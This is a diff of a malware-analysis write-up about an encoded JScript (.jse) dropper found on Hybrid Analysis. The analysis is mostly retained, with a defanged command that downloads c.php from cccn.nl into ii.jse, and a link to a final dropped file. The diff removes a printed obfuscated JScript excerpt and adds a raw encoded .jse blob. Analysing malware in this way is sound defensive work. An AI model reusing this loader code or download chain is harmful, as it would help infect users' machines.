@@ -29,83 +29,9 @@ So this command tries to:
 - download a file named "c.php" from h[x][x]p://cccn.nl/c.php
 - outputs the contents of this file to the temp directory and specifically to a file named ii.jse
 
-Although the domain is not live anymore and thus we cannot downloaded the `ii.jse` directly from it, we can utilize [Hybrid Analysis](https://www.hybrid-analysis.com/sample/55821b2be825629d6674884d93006440d131f77bed216d36ea20e4930a280302?environmentId=100) to get it from there.
-
-### ii.jse file analysis
-
-Getting the file, we will see it is not really readable:  
-```sh
-┌──(connar㉿kali)-[~/Documents/hybrid_analysis_sample]
-└─$ cat ii.jse       
-#@~^jh0FAA==dm3rRHmD/2,{;x9+Wk  +[Ikl3b00KD:.\l0k       o1Fx;   Nn0bU+9idC0k%324+dEkqZ';        N0k     +9I/m3r%Str^4GF{;x9+0bUnNp/m3r%.n7knh:4+l*x;    N+Wr    +[ikC0k0(DKkVk&WxE      Nn0bxn[p/l0r%1WxDUO/:tmxq';U9+Wk        nNp/CVb%ors9+[,Rx!x[0bx+9ikC3b%nlMY42'E  [+6kx[I/m3b%nl.O4vf'!UN0rUNidC0k0Y4nFf{E        N+6k    nNp/C3b%5;bm32T'!xNWrxNp/C3r0Dkh+lq'!x[n6kxn[p/C3b04W;M&+'E     NWk     +[iklVrRVlDO+MG%{;UN0bxnNIdm3r%D;D
-```  
-
-This is because `.jse` files are basically encoded JScript files and thus we need to use a decoder to convert them to javascript format.
-
-There are some tools online that decode Windows Scripts (encoded JScripts), one of them being the [scrdec18-VC8.exe](https://gist.github.com/bcse/1834878) that I used.  
-
-After using the tool, we get the following javascript code (I have used an online js beautifier for structural purposes):  
-```js
-┌──(connar㉿kali)-[~/Documents/hybrid_analysis_sample]
-└─$ cat beautified.js             
-saki8Mars39 = undefined;
-saki8formerMaking91 = undefined;
-saki8Ephesus10 = undefined;
-saki8which71 = undefined;
-saki8reviewThe55 = undefined;
-saki8broils34 = undefined;
-saki8contntsThan1 = undefined;
-saki8gilded98 = undefined;
-saki8earth63 = undefined;
-saki8earth63 = undefined;
-saki8thee13 = undefined;
-saki8quick30 = undefined;
-saki8time51 = undefined;
-saki8hour36 = undefined;
-saki8latter78 = undefined;
-saki8turning24 = undefined;
-saki8strong50 = undefined;
-saki8more23 = undefined;
-saki8heirsMay63 = undefined;
-saki8then21 = undefined;
-saki8princes45 = undefined;
-saki8rareSince57 = undefined;
-var saki8haveTogether48 = {
-    st9a: function(abert, z, n, m) {
-        return String["fromChar" + "Co" + "" + "de"]((+'111') + 5)
-    },
-    revie5: '123'
-} ['st9a'](function() {
-    return true;
-}, 0, 0, 1) + {
-    marbl8a: function(abert, z, n, m) {
-        return String["fromChar" + "Co" + "" + "de"]((+'109') + 5)
-    },
-    studi8: '95'
-} ['marbl8a'](function() {
-    return true;
-}, 0, 0, 1) + {
-    meta9a: function(abert, z, n, m) {
-        return String["fromChar" + "Co" + "" + "de"]((+'92') + 5)
-    },
-    brig6: '103'
-} ['meta9a'](function() {
-    return true;
-}, 0, 0, 1) + {
-    works9a: function(abert, z, n, m) {
-        return String["fromChar" + "Co" + "" + "de"]((+'105') + 5)
-    },
-    this94: '100'
-} ['works9a'](function() {
-    return true;
-}, 0, 0, 1) + {
-    whi5a: function(abert, z, n, m) {
-        return String["fromChar" + "Co" + "" + "de"]((+'110') + 5)
-    },
-    pre8: '121'
-} ['whi5a'](function() {
-
-// A ton more code
+Unfortunately, the domain does not exist anymore to be able to download the ii.jse for further analysis. But to my luck, I could find the contents of it in [Hybrid Analysis strings part](https://www.hybrid-analysis.com/sample/55821b2be825629d6674884d93006440d131f77bed216d36ea20e4930a280302?environmentId=100):
+```jse
+#@~ ^ jh0FAA == dm3rRHmD / 2, {;x9 + Wk + [Ikl3b00KD: \x7f.\l0k o1Fx;Nn0bU + 9 idC0k % 324 + dEkqZ '; N\x7f0k +9I/m3r%Str^4GF{;x9+0bUnNp/m3r%.n7knh:4+l*x; N+Wr +[ikC0k0(DKkVk&WxE Nn0bxn[p/l0r%1WxDUO/:tmxq';U9 + Wk nNp / CVb % ors9 + [, Rx!x[\x7f0 bx + 9 ikC3b % nlMY4\x7f 2 'E [+6kx\x7f[I/m3b%nl.O4vf'!UN\x7f 0 rU\x7f NidC0k0Y4n\x7f Ff { E N + 6 k nNp / C3b % 5;bm32T '!xN\x7fWrx\x7fNp/C3r0Dkh+lq'!x[n6kxn[p / C3b04W;M &amp;U9 + Wk n9idm3b % /DDKUol!xE NnWbx+9I/m 3 kRhGD\x7f 2 ';x[n6kU+9I/m3r04+k.dtlzv2x!x[\x7f0bx+9ikC3b%Ot\x7fx+q{Ex9n0bx+9Idl0kRw.kU^\x7f/**{;x9+Wr +NIdm3r%MCM+jbx1+*F'!UN\x7f 0 rx\x7f NI - mDPkC3b % tm - nKKo\x7f Y4 + .*R '`/D1l=0;U1YkGUvl8+MOByS ~s# M+D;D PjYMkUL]J0MG:;tlMEQJ;Wr_EJQE9+ETvc_EFqqE#_Xb)~.+7r\x7f*lEFy&B)$EdYOlvTv0;U1YkKU`* D\x7fO;D PDD;+INB!S!Bq#3 hCM4V0C=0;x1ObWUvl(+DD~.SxB:b M+O;MxPUODbxo]EWDK:;tCDEQrZGJ3EJ3J[nrT`cQEFT,Eb3*b)~kYE9kRlBO*v8]BhCM4VRCBY`0!U^YbW `b .nDE.x,OD!+INB!~TS8#Q snDl1m)6Ex1YbGxvl8+MYS"Bx~sb M+Y!.UPUYMkUo,E6DG:;4lMJQE;WJQEr_EN\x7fEY`c3BO B*_lb8B4.kTvlv8!&EN$E:+
 ```
 
 I did not expect anything else than more obfuscated code, but the code seems "relatively" easy to understand from a first glance. We notice that most of the code's functionality is the same and it essentially just converts numbers to their Ascii representation.  
@@ -425,7 +351,6 @@ Even though the deobfuscated strings are concatenated to each other, we can get 
 The final file that will be dropped (named `pollos` from the cracked hash) can be found [here](https://www.hybrid-analysis.com/sample/9efc3aa23de09f1713a2e138760a42d0a14568c86cdbb5499d2adddbe197db57/5935aeaeaac2ed0e41bfe09c).  
 
 TBC
-
 
 
 **References**
